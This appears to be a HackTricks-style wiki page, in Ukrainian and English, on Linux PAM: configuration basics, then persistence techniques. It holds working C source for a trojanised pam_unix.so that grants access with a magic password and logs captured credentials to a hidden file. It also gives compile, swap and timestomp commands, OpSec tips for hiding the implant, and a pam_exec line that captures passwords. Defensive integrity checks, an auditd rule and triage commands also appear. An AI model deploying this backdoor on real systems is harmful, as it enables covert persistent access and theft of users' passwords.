# PAM - Pluggable Authentication Modules

{{#include ../../banners/hacktricks-training.md}}

### Основна інформація

**PAM (Pluggable Authentication Modules)** діє як механізм безпеки, який **перевіряє особу користувачів, що намагаються отримати доступ до комп'ютерних сервісів**, контролюючи їхній доступ на основі різних критеріїв. Це можна порівняти з цифровим охоронцем, який гарантує, що лише авторизовані користувачі можуть взаємодіяти з певними сервісами, водночас потенційно обмежуючи їхнє використання для запобігання перевантаженню системи.

#### Файли конфігурації

- **Solaris та UNIX-based systems** зазвичай використовують центральний файл конфігурації, розташований у `/etc/pam.conf`.
- **Linux systems** надають перевагу підходу з каталогом, зберігаючи конфігурації для окремих сервісів у `/etc/pam.d`. Наприклад, файл конфігурації для login service розташований у `/etc/pam.d/login`.<sup>[[1]](#references)</sup>

Приклад конфігурації PAM для login service може мати такий вигляд:
```
auth required /lib/security/pam_securetty.so
auth required /lib/security/pam_nologin.so
auth sufficient /lib/security/pam_ldap.so
auth required /lib/security/pam_unix_auth.so try_first_pass
account sufficient /lib/security/pam_ldap.so
account required /lib/security/pam_unix_acct.so
password required /lib/security/pam_cracklib.so
password required /lib/security/pam_ldap.so
password required /lib/security/pam_pwdb.so use_first_pass
session required /lib/security/pam_unix_session.so
```
#### **PAM Management Realms**

Ці realms, або management groups, включають **auth**, **account**, **password** і **session**, кожен з яких відповідає за різні аспекти процесу authentication і session management:<sup>[[1]](#references)</sup>

- **Auth**: Перевіряє identity користувача, часто запитуючи password.
- **Account**: Обробляє перевірку account, перевіряючи такі умови, як membership у group або обмеження за часом доби.
- **Password**: Керує оновленням password, зокрема перевірками complexity або запобіганням dictionary attacks.
- **Session**: Керує діями під час початку або завершення service session, наприклад монтуванням директорій або встановленням resource limits.

#### **PAM Module Controls**

Controls визначають реакцію module на success або failure, впливаючи на загальний процес authentication. До них належать:<sup>[[1]](#references)</sup>

- **Required**: Failure required module зрештою призводить до failure, але лише після перевірки всіх наступних modules.
- **Requisite**: Негайне завершення процесу в разі failure.
- **Sufficient**: Success пропускає решту перевірок того самого realm, якщо наступний module не завершується з failure.
- **Optional**: Спричиняє failure лише тоді, коли є єдиним module у stack.

#### Offensive Semantics That Matter

Під час backdooring PAM **location of the inserted rule** часто важливіший за сам payload:

- `include` і `substack` підтягують rules з інших files, тому редагування `sshd` може вплинути лише на SSH, тоді як редагування `system-auth`, `common-auth` або іншого shared stack впливає одразу на кілька services.
- PAM також підтримує bracketed controls, такі як `[success=1 default=ignore]`. Їх можна використати для **skip one or more modules** після успішної custom check замість помітної заміни `pam_unix.so`.
- `module-path` може бути **absolute** (`/usr/lib/security/pam_custom.so`) або **relative** до default PAM module directory. У сучасних Linux systems реальними directories часто є `/lib/security`, `/lib64/security`, `/usr/lib/security` або multiarch paths на кшталт `/usr/lib/x86_64-linux-gnu/security`.

Quick operator takeaway: завжди визначайте **full service graph** перед patching. Наприклад, `sshd -> password-auth -> system-auth` у деяких distros або `sshd -> system-remote-login -> system-login -> system-auth` в інших означає, що той самий one-line implant може поширитися значно ширше, ніж передбачалося.

#### Example Scenario

У setup з кількома auth modules процес виконується у суворому порядку. Якщо module `pam_securetty` визначає login terminal як unauthorized, root logins блокуються, однак усі modules все одно обробляються через його статус "required". `pam_env` встановлює environment variables, потенційно покращуючи user experience. Modules `pam_ldap` і `pam_unix` працюють разом для authentication користувача, причому `pam_unix` намагається використати раніше наданий password, підвищуючи efficiency та flexibility методів authentication.


## Backdooring PAM – Hooking `pam_unix.so`

Класичний persistence trick у high-value Linux environments — **swap legitimate PAM library with a trojanised drop-in**. Оскільки кожен SSH / console login зрештою викликає `pam_unix.so:pam_sm_authenticate()`, кількох рядків C достатньо, щоб capture credentials або реалізувати *magic* password bypass.<sup>[[2]](#references)</sup>

### Compilation Cheatsheet
<details>
<summary>Sample `pam_unix.so` trojan</summary>
```c
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>

static int (*orig)(pam_handle_t *, int, int, const char **);
static const char *MAGIC = "Sup3rS3cret!";

int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
const char *user, *pass;
pam_get_user(pamh, &user, NULL);
pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

/* Magic pwd → immediate success */
if(pass && strcmp(pass, MAGIC) == 0) return PAM_SUCCESS;

/* Credential harvesting */
int fd = open("/usr/bin/.dbus.log", O_WRONLY|O_APPEND|O_CREAT, 0600);
dprintf(fd, "%s:%s\n", user, pass);
close(fd);

/* Fall back to original function */
if(!orig) {
orig = dlsym(RTLD_NEXT, "pam_sm_authenticate");
}
return orig(pamh, flags, argc, argv);
}
```
</details>

Скомпілювати та непомітно замінити:
```bash
gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
mv pam_unix.so /lib/security/pam_unix.so
chmod 644 /lib/security/pam_unix.so     # keep original perms
touch -r /bin/ls /lib/security/pam_unix.so  # timestomp
```
### Поради з OpSec
1. **Атомарний перезапис** – записуйте у тимчасовий файл, а потім виконуйте `mv`, щоб уникнути напівзаписаних бібліотек, які можуть заблокувати SSH.
2. Розміщення log-файлу, наприклад `/usr/bin/.dbus.log`, дозволяє йому злитися з легітимними артефактами desktop.
3. Зберігайте експорти символів ідентичними (`pam_sm_setcred` тощо), щоб уникнути некоректної роботи PAM.

### Виявлення
* Порівнюйте MD5/SHA256 `pam_unix.so` з файлом із пакета дистрибутива.
* `rpm -V pam` або `debsums -s libpam-modules` допоможуть виявити замінені бібліотеки без ручного хешування.
* Перевіряйте наявність world-writable або нетипового власника в `/lib/security/`.
* Правило `auditd`: `-w /lib/security/pam_unix.so -p wa -k pam-backdoor`.
* Виконайте Grep конфігурацій PAM для пошуку неочікуваних модулів: `grep -R "pam_[a-z].*\.so" /etc/pam.d/ | grep -v pam_unix`.

### Команди для швидкого triage (після компрометації або під час threat hunting)
```bash
# 1) Spot alien PAM objects
find /{lib,usr/lib,usr/local/lib}{,64}/security -type f -printf '%p %s %M %u:%g %TY-%Tm-%Td\n' | grep -E 'pam_|libselinux'

# 2) Verify package integrity
command -v rpm >/dev/null && rpm -V pam || debsums -s libpam-modules

# 3) Identify non-packaged PAM modules
for f in /{lib,usr/lib,usr/local/lib}{,64}/security/*.so; do
dpkg -S "$f" >/dev/null 2>&1 || echo "UNPACKAGED: $f";
done

# 4) Look for stealth config edits
grep -R "pam_.*\.so" /etc/pam.d/ | grep -E 'plg|selinux|custom|exec'
```
### Зловживання `pam_exec` для persistence
Замість заміни `pam_unix.so`, менш інвазивний підхід — додати рядок `pam_exec` до `/etc/pam.d/sshd`, щоб кожен SSH login запускав implant, залишаючи звичайний stack без змін:
```bash
# Run on successful auth and receive the typed password on stdin
auth optional pam_exec.so quiet expose_authtok /usr/local/bin/.ssh_hook.sh
```
`pam_exec` отримує метадані PAM у змінних середовища, таких як `PAM_USER`, `PAM_RHOST`, `PAM_SERVICE`, `PAM_TTY` і `PAM_TYPE`. За допомогою `expose_authtok` helper також може прочитати пароль зі `stdin` під час фаз `auth` або `password`. Якщо потрібно, щоб helper запускався з effective UID замість real UID, додайте `seteuid`.

Практичні примітки:

- `session optional pam_exec.so ...` краще підходить для **дій після входу**, таких як повторне відкриття сокетів або запуск від'єднаного daemon.
- `auth optional pam_exec.so quiet expose_authtok ...` зазвичай використовується для **захоплення облікових даних**, оскільки виконується до відкриття session.
- `type=session` або `type=auth` можна використовувати, щоб обмежити виконання певною фазою PAM і уникнути зайвого подвійного виконання.

### Робота з інструментами дистрибутива: `authselect`

У RHEL, CentOS Stream, Fedora та похідних системах прямі зміни до згенерованих файлів, таких як `/etc/pam.d/system-auth` або `/etc/pam.d/password-auth`, можуть бути **перезаписані `authselect`**. Для збереження змін operators часто редагують активний custom profile у `/etc/authselect/custom/<profile>/`, а потім повторно обирають або застосовують його.

Типовий workflow, якщо у вас є root:
```bash
# Inspect the active profile first
authselect current

# If a custom profile already exists, edit its PAM templates instead of system-auth directly
find /etc/authselect/custom -maxdepth 2 -type f \( -name 'system-auth' -o -name 'password-auth' \) -ls

# Re-apply the profile after modifying the template files
authselect select custom/<profile>
```
Це важливо як для offense, так і для triage: якщо `/etc/pam.d/system-auth` містить banner `Generated by authselect` і `Do not modify this file manually`, тоді справжня persistence point може знаходитися в `/etc/authselect/custom/`, а не в `/etc/pam.d/`.

### Recent tradecraft seen in the wild

Нещодавні звіти за 2025 рік про Linux backdoor **Plague** показали подальший розвиток тієї самої основної ідеї: malicious PAM component зі **static bypass password**, а також очищення SSH-related environment variables і shell history (`HISTFILE=/dev/null)` для зменшення слідів сесії після login.<sup>[[3]](#references)</sup> Це корисний hunting pattern, оскільки логіка backdoor може знаходитися в PAM, тоді як stealth artifacts з'являються лише **після** успішного authentication.


## Посилання

- [1] [pam.conf(5) / pam.d(5) - Linux-PAM Manual](https://man7.org/linux/man-pages/man5/pam.d.5.html)
- [2] [The Covert Operator's Playbook: Infiltration of Global Telecom Networks - Unit 42](https://unit42.paloaltonetworks.com/infiltration-of-global-telecom-networks/)
- [3] [Nextron Systems - Plague: A Newly Discovered PAM-Based Backdoor for Linux](https://www.nextron-systems.com/2025/08/01/plague-a-newly-discovered-pam-based-backdoor-for-linux/)

{{#include ../../banners/hacktricks-training.md}}
